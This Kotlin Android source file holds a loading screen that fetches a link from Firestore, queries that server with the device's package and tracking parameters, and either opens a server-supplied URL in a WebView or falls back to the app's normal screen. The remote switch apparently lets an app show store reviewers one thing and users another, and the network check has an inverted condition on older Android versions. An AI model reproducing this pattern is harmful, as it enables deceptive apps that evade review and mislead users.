package com.template

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.WindowInsets
import android.view.WindowManager
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessagingService
import com.template.databinding.ActivityWebBinding
import com.template.services.MyFirebaseMessagingService
import okhttp3.OkHttpClient
import okhttp3.Request
import okio.use
import java.io.IOException
import java.util.*
import android.Manifest
import android.content.pm.PackageManager
import com.google.firebase.FirebaseApp


class LoadingActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 112
    private lateinit var analytics: FirebaseAnalytics
    private lateinit var messaging: FirebaseMessagingService
    var userAgent: String = ""
    var flag: Boolean = false


    @SuppressLint("SuspiciousIndentation")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        FirebaseApp.initializeApp(this)
        Log.d("nn97", "$savedInstanceState loading act")
        //Ask for Permission in android 13
        if (Build.VERSION.SDK_INT > 32) {
            if (!shouldShowRequestPermissionRationale("112")) {
                getNotificationPermission()
            }
        }
        setContentView(R.layout.activity_loading)
        @Suppress("DEPRECATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.insetsController?.hide(WindowInsets.Type.statusBars())
        } else {
            window.setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
            )
        }
        analytics = Firebase.analytics
        messaging = MyFirebaseMessagingService()
        val bindingWeb = ActivityWebBinding.inflate(layoutInflater)
        userAgent = bindingWeb.webView.settings.userAgentString
        if (!isNetworkConnected()) {
            startActivity(Intent(this, MainActivity::class.java))
        } else {
            val progressBar: ProgressBar = findViewById(R.id.progressBar)
            progressBar.visibility = View.VISIBLE
            val db = Firebase.firestore
            db.collection("database").document("check")
                .get()
                .addOnSuccessListener {
                    val local = it.get("link").toString()
                    Log.d("nn97", "$local то, что получили из файрбэйза")
                    if (local != "null") {
                        val link = makingLink(local)
                        Log.d("nn97", "$link с телефона обращаемся к этому серверу, сайту")
                        connectionToServer(link)
                    } else startActivity(Intent(this, MainActivity::class.java))
                }.addOnFailureListener {
                    startActivity(Intent(this, MainActivity::class.java))
                }
        }
    }

    private fun getNotificationPermission() {
        try {
            if (Build.VERSION.SDK_INT > 32) {
                ActivityCompat.requestPermissions(
                    this, arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                    PERMISSION_REQUEST_CODE
                )
            }
        } catch (e: Exception) {
            Log.d("exc", e.toString())
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String?>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.size > 0 &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED
                ) {
                    // allow
                    Log.d("body", "granted")
                } else {
                    //deny
                    Log.d("permission", "denied")
                }
                return
            }
        }
    }

    private fun makingLink(domain: String): String {
        val uuid = UUID.randomUUID().toString()
        return "$domain/?packageid=$packageName&userid=$uuid&getz=Europe/Moscow&getr=utm_source=google-play&utm_medium=organic"
    }

    private fun connectionToServer(link: String) {
        //синх запрос в новом потоке
        Thread {
            val client = OkHttpClient()
            val request: Request =
                Request.Builder().url(link).addHeader("User-Agent", userAgent).build()
            Log.d("nn97", "обращение к серваку")
            try {
                client.newCall(request).execute().use {
                    if (!it.isSuccessful) {
                        Log.d("nn97", "${it.code} ${it.message}")
                        startActivity(Intent(this, MainActivity::class.java))
                    } else {
                        Log.d("nn97", "200")
                        val urlForWebActivity = it.body!!.string()
                        val sharedPref =
                            this.getSharedPreferences("main", Context.MODE_PRIVATE) ?: return@Thread
                        with(sharedPref.edit()) {
                            putString(KEY, urlForWebActivity)
                            apply()
                        }
                        Log.d("nn97", "открывай веб")
                        flag = true
                        startActivity(Intent(this, WebActivity::class.java))
                    }
                }
            } catch (e: IOException) {
                println("Ошибка подключения: $e")
            }
        }.start()
    }

    companion object {
        private const val KEY = "urlForWeb"
    }

    private fun isNetworkConnected(): Boolean {
        var connected = true
        val connManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val networkCapabilities = connManager.getNetworkCapabilities(connManager.activeNetwork)
            if (networkCapabilities == null) {
                connected = false
            }
        } else {
            val activeNetwork = connManager.activeNetworkInfo
            if (activeNetwork?.isConnectedOrConnecting == true && activeNetwork.isAvailable) {
                connected = false
            }
        }
        return connected
    }
}